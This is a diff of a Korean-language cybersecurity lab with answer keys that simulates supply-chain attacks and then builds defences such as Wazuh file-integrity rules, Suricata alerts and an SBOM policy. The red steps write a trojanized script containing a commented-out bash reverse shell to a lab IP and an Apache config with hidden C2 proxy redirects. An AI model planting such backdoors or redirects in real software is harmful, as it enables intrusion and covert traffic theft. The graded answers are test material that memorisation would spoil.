@@ -3,7 +3,8 @@ title: 공급망 공격 시나리오 — Supply Chain Compromise 탐지
 version: non-ai
 course: battle-adv-nonai
 week: 12
-description: 공급망 공격(Supply Chain Compromise)을 시뮬레이션하고 탐지한다. 악성 패키지 삽입, 웹 서비스 변조, 설정 파일 조작을 Red Phase에서 재현하고, Blue Phase에서 FIM, 패키지 무결성 검증, 변조 탐지를 구현한다.
+description: 공급망 공격(Supply Chain Compromise)을 시뮬레이션하고 탐지한다. 악성 패키지 삽입, 웹 서비스 변조, 설정
+  파일 조작을 Red Phase에서 재현하고, Blue Phase에서 FIM, 패키지 무결성 검증, 변조 탐지를 구현한다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -21,194 +22,180 @@ infra_requirements:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: "[RED] 공급망 공격 시뮬레이션 — 악성 스크립트가 삽입된 가짜 패키지를 /tmp에 생성하라. 정상 유틸리티로 위장하되 백도어 코드를 포함하라."
+  instruction: '[RED] 공급망 공격 시뮬레이션 — 악성 스크립트가 삽입된 가짜 패키지를 /tmp에 생성하라. 정상 유틸리티로 위장하되
+    백도어 코드를 포함하라.'
   hint: 정상 이름의 스크립트에 숨겨진 백도어 코드를 포함한다.
   category: exploit
   points: 10
-  answer: 'cat > /tmp/supply_chain_package.sh << ''EOF''
-#!/bin/bash
-# system-health-monitor v2.1.3 (TROJANIZED)
-# Normal functionality
-echo "System Health: OK"
-uptime
-# Hidden backdoor (would be obfuscated in real attack)
-# bash -i >& /dev/tcp/10.20.30.201/4444 0>&1
-echo "SUPPLY_CHAIN_BACKDOOR_SIM" > /tmp/sc_beacon.txt
-EOF
-chmod +x /tmp/supply_chain_package.sh && echo "Trojanized package created" && file /tmp/supply_chain_package.sh && sha256sum /tmp/supply_chain_package.sh'
-  answer_detail: "공급망 공격(T1195.002)에서 공격자는 정상 소프트웨어에 백도어를 삽입한다. SolarWinds(2020), Codecov(2021) 등이 대표적 사례이다. 정상 기능을 유지하면서 숨겨진 악성 코드를 포함한다."
+  answer: 'cat > /tmp/supply_chain_package.sh << ''EOF'' #!/bin/bash # system-health-monitor
+    v2.1.3 (TROJANIZED) # Normal functionality echo "System Health: OK" uptime # Hidden
+    backdoor (would be obfuscated in real attack) # bash -i >& /dev/tcp/10.20.30.201/4444
+    0>&1 echo "SUPPLY_CHAIN_BACKDOOR_SIM" > /tmp/sc_beacon.txt EOF chmod +x /tmp/supply_chain_package.sh
+    && echo "Trojanized package created" && file /tmp/supply_chain_package.sh && sha256sum
+    /tmp/supply_chain_package.sh'
+  answer_detail: 공급망 공격(T1195.002)에서 공격자는 정상 소프트웨어에 백도어를 삽입한다. SolarWinds(2020), Codecov(2021)
+    등이 대표적 사례이다. 정상 기능을 유지하면서 숨겨진 악성 코드를 포함한다.
   verify:
     type: output_contains
     expect: Trojanized package
   target_vm: attacker
 - order: 2
-  instruction: "[RED] 웹 서비스 변조 시뮬레이션 — /tmp에 변조된 웹 설정 파일을 생성하라. 정상 Apache 설정에 악성 리다이렉트를 숨겨라."
+  instruction: '[RED] 웹 서비스 변조 시뮬레이션 — /tmp에 변조된 웹 설정 파일을 생성하라. 정상 Apache 설정에 악성 리다이렉트를
+    숨겨라.'
   hint: Apache 설정에 숨겨진 ProxyPass를 추가하여 트래픽을 C2로 전달한다.
   category: exploit
   points: 10
-  answer: 'cat > /tmp/sc_apache_backdoor.conf << ''EOF''
-# Apache configuration (COMPROMISED)
-<VirtualHost *:80>
-    ServerName web.lab.local
-    DocumentRoot /var/www/html
-    # Normal config above...
-    # Hidden C2 redirect (supply chain implant)
-    # ProxyPass /health-check http://10.20.30.201:8080/beacon
-    # ProxyPassReverse /health-check http://10.20.30.201:8080/beacon
-    RewriteEngine On
-    # RewriteRule ^/update-check$ http://10.20.30.201:8080/c2 [P]
-</VirtualHost>
-EOF
-echo "Compromised Apache config created (simulation)" && sha256sum /tmp/sc_apache_backdoor.conf'
-  answer_detail: 웹 서버 설정 변조(T1195)는 정상 설정에 ProxyPass/RewriteRule을 숨겨 특정 URL 패턴을 C2 서버로 리다이렉트한다. 설정 파일이 길면 발견이 어렵다.
+  answer: 'cat > /tmp/sc_apache_backdoor.conf << ''EOF'' # Apache configuration (COMPROMISED)
+    <VirtualHost *:80> ServerName web.lab.local DocumentRoot /var/www/html # Normal
+    config above... # Hidden C2 redirect (supply chain implant) # ProxyPass /health-check
+    http://10.20.30.201:8080/beacon # ProxyPassReverse /health-check http://10.20.30.201:8080/beacon
+    RewriteEngine On # RewriteRule ^/update-check$ http://10.20.30.201:8080/c2 [P]
+    </VirtualHost> EOF echo "Compromised Apache config created (simulation)" && sha256sum
+    /tmp/sc_apache_backdoor.conf'
+  answer_detail: 웹 서버 설정 변조(T1195)는 정상 설정에 ProxyPass/RewriteRule을 숨겨 특정 URL 패턴을 C2
+    서버로 리다이렉트한다. 설정 파일이 길면 발견이 어렵다.
   verify:
     type: output_contains
     expect: COMPROMISED
   target_vm: attacker
 - order: 3
-  instruction: "[BLUE] Phase 전환 — FIM(File Integrity Monitoring)을 설정하라. 웹 서버 설정, 시스템 바이너리, crontab에 대한 Wazuh syscheck 규칙을 작성하라."
+  instruction: '[BLUE] Phase 전환 — FIM(File Integrity Monitoring)을 설정하라. 웹 서버 설정, 시스템
+    바이너리, crontab에 대한 Wazuh syscheck 규칙을 작성하라.'
   hint: Wazuh syscheck으로 critical 파일의 변경을 실시간 감시한다.
   category: defense
   points: 10
-  answer: "cat > /tmp/fim_supply_chain.xml << 'EOF'
-<syscheck>
-  <disabled>no</disabled>
-  <frequency>300</frequency>
-  <alert_new_files>yes</alert_new_files>
-  <!-- Web server configs -->
-  <directories check_all=\"yes\" realtime=\"yes\" report_changes=\"yes\">/etc/apache2,/etc/nginx</directories>
-  <!-- System binaries -->
-  <directories check_all=\"yes\" realtime=\"yes\">/usr/bin,/usr/sbin,/usr/local/bin</directories>
-  <!-- Cron and systemd -->
-  <directories check_all=\"yes\" realtime=\"yes\">/etc/crontab,/var/spool/cron,/etc/systemd/system</directories>
-  <!-- Package manager -->
-  <directories check_all=\"yes\" realtime=\"yes\">/etc/apt/sources.list.d</directories>
-  <!-- Ignore false positives -->
-  <ignore type=\"sregex\">.swp$|.swx$|~$</ignore>
-</syscheck>
-EOF
-cat /tmp/fim_supply_chain.xml"
-  answer_detail: FIM은 공급망 공격에서 변조된 파일을 탐지하는 핵심 방어이다. 웹 서버 설정, 시스템 바이너리, 크론, 패키지 소스를 실시간 감시하고 변경 내용을 보고한다.
+  answer: '🖥️ UI: Dashboard → Security events → rule.groups: syscheck 필터
+
+    📎 참고 (CLI): cat > /tmp/fim_supply_chain.xml << ''EOF'' <syscheck> <disabled>no</disabled>
+    <frequency>300</frequency> <alert_new_files>yes</alert_new_files> <!-- Web server
+    configs --> <directories check_all="yes" realtime="yes" report_changes="yes">/etc/apache2,/etc/nginx</directories>
+    <!-- System binaries --> <directories check_all="yes" realtime="yes">/usr/bin,/usr/sbin,/usr/local/bin</directories>
+    <!-- Cron and systemd --> <directories check_all="yes" realtime="yes">/etc/crontab,/var/spool/cron,/etc/systemd/system</directories>
+    <!-- Package manager --> <directories check_all="yes" realtime="yes">/etc/apt/sources.list.d</directories>
+    <!-- Ignore false positives --> <ignore type="sregex">.swp$|.swx$|~$</ignore>
+    </syscheck> EOF cat /tmp/fim_supply_chain.xml'
+  answer_detail: FIM은 공급망 공격에서 변조된 파일을 탐지하는 핵심 방어이다. 웹 서버 설정, 시스템 바이너리, 크론, 패키지 소스를
+    실시간 감시하고 변경 내용을 보고한다.
   verify:
     type: output_contains
     expect: syscheck
   target_vm: siem
 - order: 4
-  instruction: "[BLUE] 패키지 무결성 검증 스크립트를 작성하라. dpkg --verify로 시스템 패키지의 변조를 탐지하고, 핵심 바이너리의 해시를 검증하라."
+  instruction: '[BLUE] 패키지 무결성 검증 스크립트를 작성하라. dpkg --verify로 시스템 패키지의 변조를 탐지하고, 핵심
+    바이너리의 해시를 검증하라.'
   hint: dpkg --verify와 sha256sum으로 무결성을 검증한다.
   category: defense
   points: 10
-  answer: 'echo "=== Package Integrity Verification ===" && echo "[1] dpkg verify (modified packages):" && dpkg --verify 2>/dev/null | head -10 || echo "  dpkg verify not available" && echo "[2] Critical binary hashes:" && for bin in /usr/bin/ssh /usr/bin/curl /usr/bin/python3; do if [ -f "$bin" ]; then echo "  $(sha256sum $bin)"; fi; done && echo "[3] Baseline comparison:" && echo "  Store hashes in /etc/security/baseline_hashes.txt" && echo "  Compare daily with: sha256sum -c baseline_hashes.txt" && echo "Package integrity check complete"'
-  answer_detail: 패키지 무결성 검증은 공급망 공격으로 변조된 바이너리를 탐지한다. dpkg --verify는 설치된 패키지의 해시를 검증하고, 핵심 바이너리의 SHA256을 기준선과 비교한다.
+  answer: 'echo "=== Package Integrity Verification ===" && echo "[1] dpkg verify
+    (modified packages):" && dpkg --verify 2>/dev/null | head -10 || echo "  dpkg
+    verify not available" && echo "[2] Critical binary hashes:" && for bin in /usr/bin/ssh
+    /usr/bin/curl /usr/bin/python3; do if [ -f "$bin" ]; then echo "  $(sha256sum
+    $bin)"; fi; done && echo "[3] Baseline comparison:" && echo "  Store hashes in
+    /etc/security/baseline_hashes.txt" && echo "  Compare daily with: sha256sum -c
+    baseline_hashes.txt" && echo "Package integrity check complete"'
+  answer_detail: 패키지 무결성 검증은 공급망 공격으로 변조된 바이너리를 탐지한다. dpkg --verify는 설치된 패키지의 해시를
+    검증하고, 핵심 바이너리의 SHA256을 기준선과 비교한다.
   verify:
     type: output_contains
     expect: Package Integrity
   target_vm: web
 - order: 5
-  instruction: "[BLUE] Suricata로 공급망 공격 관련 네트워크 시그니처를 탐지하는 규칙을 작성하라. 비인가 외부 연결, 비정상 업데이트 트래픽을 탐지하라."
+  instruction: '[BLUE] Suricata로 공급망 공격 관련 네트워크 시그니처를 탐지하는 규칙을 작성하라. 비인가 외부 연결, 비정상
+    업데이트 트래픽을 탐지하라.'
   hint: 내부 서버에서 비인가 외부 IP로의 연결을 탐지한다.
   category: defense
   points: 10
-  answer: 'cat > /tmp/supply_chain_detection.rules << ''EOF''
-# Supply chain attack indicators
-alert http 10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Web server unexpected outbound HTTP"; flow:to_server,established; sid:6000001; rev:1;)
-alert tls 10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Web server unexpected outbound TLS"; flow:to_server,established; sid:6000002; rev:1;)
-alert http any any -> 10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Suspicious update URL pattern"; flow:to_server,established; content:"/update-check"; http.uri; sid:6000003; rev:1;)
-EOF
-cat /tmp/supply_chain_detection.rules'
-  answer_detail: 공급망 공격 탐지에서 웹 서버의 비인가 아웃바운드 연결(ProxyPass를 통한 C2), 의심스러운 업데이트 URL 패턴을 Suricata로 탐지한다. 웹 서버는 일반적으로 아웃바운드 연결을 하지 않는다.
+  answer: 'cat > /tmp/supply_chain_detection.rules << ''EOF'' # Supply chain attack
+    indicators alert http 10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN:
+    Web server unexpected outbound HTTP"; flow:to_server,established; sid:6000001;
+    rev:1;) alert tls 10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Web
+    server unexpected outbound TLS"; flow:to_server,established; sid:6000002; rev:1;)
+    alert http any any -> 10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Suspicious update
+    URL pattern"; flow:to_server,established; content:"/update-check"; http.uri; sid:6000003;
+    rev:1;) EOF cat /tmp/supply_chain_detection.rules'
+  answer_detail: 공급망 공격 탐지에서 웹 서버의 비인가 아웃바운드 연결(ProxyPass를 통한 C2), 의심스러운 업데이트 URL
+    패턴을 Suricata로 탐지한다. 웹 서버는 일반적으로 아웃바운드 연결을 하지 않는다.
   verify:
     type: output_contains
     expect: SUPPLY-CHAIN
   target_vm: secu
 - order: 6
-  instruction: "[BLUE] 공급망 보안 강화를 위한 SBOM(Software Bill of Materials) 관리 정책을 설계하라."
+  instruction: '[BLUE] 공급망 보안 강화를 위한 SBOM(Software Bill of Materials) 관리 정책을 설계하라.'
   hint: 소프트웨어 구성 요소 목록, 취약점 추적, 업데이트 정책을 정의한다.
   category: defense
   points: 10
-  answer: "cat > /tmp/sbom_policy.txt << 'EOF'
-=== Software Bill of Materials (SBOM) Policy ===
+  answer: 'cat > /tmp/sbom_policy.txt << ''EOF'' === Software Bill of Materials (SBOM)
+    Policy ===
 
-1. SBOM Requirements:
-   - All deployed software must have SBOM (SPDX or CycloneDX format)
-   - SBOM updated on every release/patch
-   - Includes: name, version, license, dependencies, hashes
+    1. SBOM Requirements: - All deployed software must have SBOM (SPDX or CycloneDX
+    format) - SBOM updated on every release/patch - Includes: name, version, license,
+    dependencies, hashes
 
-2. Vulnerability Tracking:
-   - Daily CVE scan against SBOM components
-   - Critical CVE: patch within 24 hours
-   - High CVE: patch within 7 days
-   - Medium CVE: patch within 30 days
+    2. Vulnerability Tracking: - Daily CVE scan against SBOM components - Critical
+    CVE: patch within 24 hours - High CVE: patch within 7 days - Medium CVE: patch
+    within 30 days
 
-3. Supply Chain Controls:
-   - Package sources: Only official repositories + verified mirrors
-   - Binary verification: SHA256 hash check before deployment
-   - Code signing: All internal packages must be signed
-   - Dependency pinning: Lock versions in requirements files
+    3. Supply Chain Controls: - Package sources: Only official repositories + verified
+    mirrors - Binary verification: SHA256 hash check before deployment - Code signing:
+    All internal packages must be signed - Dependency pinning: Lock versions in requirements
+    files
 
-4. Infrastructure SBOM (10.20.30.0/24):
-   | Server | Key Software | Version |
-   |--------|-------------|---------|
-   | web | Apache, JuiceShop, DVWA | Track all |
-   | secu | Suricata, nftables | Track all |
-   | siem | Wazuh Manager | Track all |
-   | attacker | Kali tools | Track all |
-EOF
-cat /tmp/sbom_policy.txt"
-  answer_detail: SBOM은 소프트웨어 구성 요소를 추적하여 공급망 취약점을 관리한다. CVE 매칭, 바이너리 검증, 코드 서명, 의존성 고정이 핵심 통제이다.
+    4. Infrastructure SBOM (10.20.30.0/24): | Server | Key Software | Version | |--------|-------------|---------|
+    | web | Apache, JuiceShop, DVWA | Track all | | secu | Suricata, nftables | Track
+    all | | siem | Wazuh Manager | Track all | | attacker | Kali tools | Track all
+    | EOF cat /tmp/sbom_policy.txt'
+  answer_detail: SBOM은 소프트웨어 구성 요소를 추적하여 공급망 취약점을 관리한다. CVE 매칭, 바이너리 검증, 코드 서명, 의존성
+    고정이 핵심 통제이다.
   verify:
     type: output_contains
     expect: SBOM
   target_vm: siem
 - order: 7
-  instruction: "[BLUE] Wazuh에서 파일 무결성 변경과 비인가 패키지 설치를 탐지하는 규칙을 작성하라."
+  instruction: '[BLUE] Wazuh에서 파일 무결성 변경과 비인가 패키지 설치를 탐지하는 규칙을 작성하라.'
   hint: syscheck 이벤트와 dpkg 로그를 활용한 규칙을 작성한다.
   category: defense
   points: 10
-  answer: "cat > /tmp/wazuh_supply_chain.xml << 'EOF'\n<group name=\"supply_chain\">\n  <rule id=\"100800\" level=\"12\">\n    <if_sid>550</if_sid>\n    <match>dpkg|apt-get|pip install</match>\n    <description>SUPPLY-CHAIN: Package installation detected</description>\n    <mitre><id>T1195.002</id></mitre>\n  </rule>\n  <rule id=\"100801\" level=\"14\">\n    <if_sid>554</if_sid>\n    <match>/usr/bin|/usr/sbin|/usr/local/bin</match>\n    <description>SUPPLY-CHAIN: System binary modified</description>\n    <mitre><id>T1195</id></mitre>\n  </rule>\n</group>\nEOF\ncat /tmp/wazuh_supply_chain.xml"
-  answer_detail: Wazuh 규칙으로 패키지 설치(dpkg/apt-get/pip)와 시스템 바이너리 변경을 탐지한다. 비인가 패키지 설치는 공급망 공격의 핵심 지표이다.
+  answer: "\U0001F5A5️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인\n\U0001F4CE\
+    \ 참고 (CLI): cat > /tmp/wazuh_supply_chain.xml << 'EOF'\n<group name=\"supply_chain\"\
+    >\n  <rule id=\"100800\" level=\"12\">\n    <if_sid>550</if_sid>\n    <match>dpkg|apt-get|pip\
+    \ install</match>\n    <description>SUPPLY-CHAIN: Package installation detected</description>\n\
+    \    <mitre><id>T1195.002</id></mitre>\n  </rule>\n  <rule id=\"100801\" level=\"\
+    14\">\n    <if_sid>554</if_sid>\n    <match>/usr/bin|/usr/sbin|/usr/local/bin</match>\n\
+    \    <description>SUPPLY-CHAIN: System binary modified</description>\n    <mitre><id>T1195</id></mitre>\n\
+    \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_supply_chain.xml"
+  answer_detail: Wazuh 규칙으로 패키지 설치(dpkg/apt-get/pip)와 시스템 바이너리 변경을 탐지한다. 비인가 패키지 설치는
+    공급망 공격의 핵심 지표이다.
   verify:
     type: output_contains
     expect: supply_chain
   target_vm: siem
 - order: 8
-  instruction: "[RED/BLUE] 환경을 정리하고 공급망 공격 평가 보고서를 작성하라."
+  instruction: '[RED/BLUE] 환경을 정리하고 공급망 공격 평가 보고서를 작성하라.'
   hint: 시뮬레이션 파일을 삭제하고, 공격 벡터, 탐지 방법, 방지 대책을 정리한다.
   category: analysis
   points: 15
-  answer: "rm -f /tmp/supply_chain_*.sh /tmp/sc_*.conf /tmp/sc_beacon.txt /tmp/fim_*.xml /tmp/sbom_*.txt 2>/dev/null && cat > /tmp/supply_chain_report.txt << 'EOF'
-=== Supply Chain Attack Assessment Report ===
-Date: 2026-04-06 | Scope: 10.20.30.0/24
+  answer: 'rm -f /tmp/supply_chain_*.sh /tmp/sc_*.conf /tmp/sc_beacon.txt /tmp/fim_*.xml
+    /tmp/sbom_*.txt 2>/dev/null && cat > /tmp/supply_chain_report.txt << ''EOF'' ===
+    Supply Chain Attack Assessment Report === Date: 2026-04-06 | Scope: 10.20.30.0/24
 
-1. Attack Vectors Simulated:
-   - Trojanized package (T1195.002): Backdoor in utility script
-   - Config tampering (T1195): Hidden ProxyPass in Apache config
-   - Dependency poisoning: Malicious package in repository
+    1. Attack Vectors Simulated: - Trojanized package (T1195.002): Backdoor in utility
+    script - Config tampering (T1195): Hidden ProxyPass in Apache config - Dependency
+    poisoning: Malicious package in repository
 
-2. Detection Results:
-   | Vector | Detected | Method |
-   |--------|----------|--------|
-   | Trojanized binary | NO | No FIM on /usr/local/bin |
-   | Config tampering | YES (with FIM) | syscheck realtime |
-   | Outbound C2 | YES | Suricata outbound rule |
-   | Package source change | NO | No apt source monitoring |
+    2. Detection Results: | Vector | Detected | Method | |--------|----------|--------|
+    | Trojanized binary | NO | No FIM on /usr/local/bin | | Config tampering | YES
+    (with FIM) | syscheck realtime | | Outbound C2 | YES | Suricata outbound rule
+    | | Package source change | NO | No apt source monitoring |
 
-3. Key Findings:
-   [C-01] No SBOM management in place
-   [C-02] No binary signing/verification
-   [H-01] FIM not covering all critical paths
-   [H-02] No automated CVE scanning
+    3. Key Findings: [C-01] No SBOM management in place [C-02] No binary signing/verification
+    [H-01] FIM not covering all critical paths [H-02] No automated CVE scanning
 
-4. Recommendations:
-   - Implement SBOM with CycloneDX format
-   - Deploy FIM on all binary and config directories
-   - Add Suricata rules for server outbound connections
-   - Establish code signing for internal packages
-   - Enable dpkg --verify in daily cron
+    4. Recommendations: - Implement SBOM with CycloneDX format - Deploy FIM on all
+    binary and config directories - Add Suricata rules for server outbound connections
+    - Establish code signing for internal packages - Enable dpkg --verify in daily
+    cron
 
-MITRE ATT&CK: T1195, T1195.002, T1059, T1071
-EOF
-cat /tmp/supply_chain_report.txt"
+    MITRE ATT&CK: T1195, T1195.002, T1059, T1071 EOF cat /tmp/supply_chain_report.txt'
   answer_detail: 공급망 공격 보고서는 시뮬레이션 벡터, 탐지 결과(50%), SBOM/FIM 부재 등 Gap, 권고사항을 포함한다.
   verify:
     type: output_contains
